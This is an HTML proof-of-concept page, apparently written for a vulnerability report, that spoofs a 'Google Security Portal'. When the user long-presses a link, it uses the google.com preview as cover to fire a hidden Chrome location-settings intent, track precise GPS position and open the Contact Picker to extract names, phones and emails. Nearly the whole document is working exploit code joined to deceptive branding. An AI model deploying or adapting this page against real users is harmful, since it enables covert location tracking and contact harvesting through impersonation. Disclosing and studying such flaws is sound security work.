<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Preview Page & Contact Picker PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 14px;
            width: 100%;
            max-width: 340px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
            box-sizing: border-box;
            width: 100%;
            cursor: pointer;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .info-box {
            margin-top: 25px;
            max-width: 320px;
            width: 100%;
            background: #ffffff;
            border: 1px solid #dadce0;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
            display: none;
            text-align: left;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
        .pulse {
            color: #34a853;
            font-weight: bold;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Long Press Preview Page & Contact Picker</h1>

    <div class="button-container">
        <!-- Tombol 1: Chrome Site Settings (Location) dengan Long Press -->
        <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="btnChromeSettings">Long Press -> Open Preview & Location Settings</a>

        <!-- Tombol 2: Contact Picker dengan Long Press (Contextmenu) -->
        <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" style="background-color: #9334e6;" id="btnContactPicker">Long Press -> Open Preview & Contact Picker</a>
    </div>

    <!-- Info Box Hasil Eksekusi & Data -->
    <div class="info-box" id="infoBox">
        <strong>Status:</strong> <span id="statusText" class="pulse">Ready...</span><br>
        <div id="coordDetails" style="margin-top: 8px;"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        let triggered = false;

        // Fungsi pelacakan lokasi akurat secara live
        const startLocationWatch = () => {
            const statusText = document.getElementById("statusText");
            const coordDetails = document.getElementById("coordDetails");

            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        statusText.className = "";
                        statusText.innerText = "Precise Location Captured Successfully!";
                        coordDetails.innerHTML = `
                            <b>Latitude:</b> ${lat}<br>
                            <b>Longitude:</b> ${lon}<br>
                            <b>Accuracy:</b> ±${accuracy} meters<br><br>
                            <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
                        `;
                    },
                    (error) => {
                        statusText.className = "";
                        statusText.innerText = `GPS Error / Permission Blocked: ${error.message}`;
                    },
                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                );
            } else {
                statusText.innerText = "Geolocation not supported.";
            }
        };

        // Handler Tombol 1: Long Press memicu Preview page (google.com via target="_blank") + Intent Chrome Settings & GPS
        const handleChromeSettingsVector = () => {
            if (triggered) return;
            triggered = true;

            const infoBox = document.getElementById("infoBox");
            const statusText = document.getElementById("statusText");
            
            infoBox.style.display = "block";
            statusText.className = "pulse";
            statusText.innerText = "Triggering Preview Page & Location Settings...";

            // Delay sebentar agar preview page / tab baru sempat terbuka di latar belakang
            setTimeout(() => {
                const intentFrame = document.createElement('iframe');
                intentFrame.style.display = 'none';
                intentFrame.src = "intent://settings/content/location#Intent;package=com.android.chrome;scheme=chrome;end;";
                document.body.appendChild(intentFrame);
                setTimeout(() => document.body.removeChild(intentFrame), 1000);

                startLocationWatch();
            }, 800);

            setTimeout(() => { triggered = false; }, 1500);
        };

        // Handler Tombol 2: Long Press memicu Preview page (google.com via target="_blank") + Contact Picker API Dialog
        const handleContactVector = async () => {
            if (triggered) return;
            triggered = true;

            const infoBox = document.getElementById("infoBox");
            const statusText = document.getElementById("statusText");
            const coordDetails = document.getElementById("coordDetails");
            
            infoBox.style.display = "block";
            statusText.className = "pulse";
            statusText.innerText = "Triggering Preview Page & Contact Picker...";

            // Memberikan jeda singkat agar interaksi long press / preview tab terbuka, lalu memunculkan dialog contact picker
            setTimeout(async () => {
                try {
                    const supportedProps = await navigator.contacts.getProperties();
                    if (supportedProps.includes('name') && supportedProps.includes('tel')) {
                        const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                        
                        statusText.className = "";
                        if (contacts.length > 0) {
                            statusText.innerText = `Successfully Extracted ${contacts.length} Contact(s)!`;
                            let contactListHTML = "<b>Extracted Contacts:</b><br>";
                            contacts.forEach((c, idx) => {
                                const name = c.name ? c.name.join(', ') : 'No Name';
                                const tel = c.tel ? c.tel.join(', ') : 'No Phone';
                                const email = c.email ? c.email.join(', ') : 'No Email';
                                contactListHTML += `[${idx+1}] ${name} | ${tel} | ${email}<br>`;
                            });
                            coordDetails.innerHTML = contactListHTML;
                        } else {
                            statusText.innerText = "No contacts selected.";
                            coordDetails.innerHTML = "";
                        }
                    } else {
                        statusText.className = "";
                        statusText.innerText = "Contact Picker properties not supported.";
                    }
                } catch (err) {
                    statusText.className = "";
                    statusText.innerText = `Contact picker cancelled or blocked: ${err.message}`;
                } finally {
                    triggered = false;
                }
            }, 800);
        };

        // Menggunakan event 'contextmenu' (Long Press pada Mobile / Klik Kanan pada Desktop)
        // Atribut href="https://google.com" dan target="_blank" tetap berjalan normal untuk membuka preview page.
        document.getElementById("btnChromeSettings").addEventListener("contextmenu", (e) => {
            handleChromeSettingsVector();
        });
        document.getElementById("btnChromeSettings").addEventListener("touchstart", () => {}, { passive: true });

        document.getElementById("btnContactPicker").addEventListener("contextmenu", (e) => {
            handleContactVector();
        });
        document.getElementById("btnContactPicker").addEventListener("touchstart", () => {}, { passive: true });

        // Auto-Sync saat pengguna kembali dari halaman preview/setelan ke tab aktif (window focus)
        window.addEventListener("focus", () => {
            if (infoBox.style.display === "block" && document.getElementById("coordDetails").innerHTML.includes("Latitude")) {
                startLocationWatch();
            }
        });
    </script>

</body>
</html>
